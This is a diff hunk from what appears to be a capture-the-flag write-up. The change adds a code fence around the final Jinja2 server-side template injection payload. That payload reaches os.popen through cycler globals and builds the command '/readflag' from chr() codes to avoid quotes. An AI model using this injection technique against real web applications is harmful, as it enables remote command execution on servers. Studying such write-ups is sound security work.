@@ -9,5 +9,6 @@ chr()
  function through cycler.init.globals.builtins.chr to build command strings without quotes, then executed via os.popen()
 Final Payload:
 
-jinja2
+```jinja2
 {%set c=cycler.init.globals.builtins.chr%}{%set o=cycler.init.globals.os%}{{o.popen(c(47)+c(114)+c(101)+c(97)+c(100)+c(102)+c(108)+c(97)+c(103)).read()}}
+```
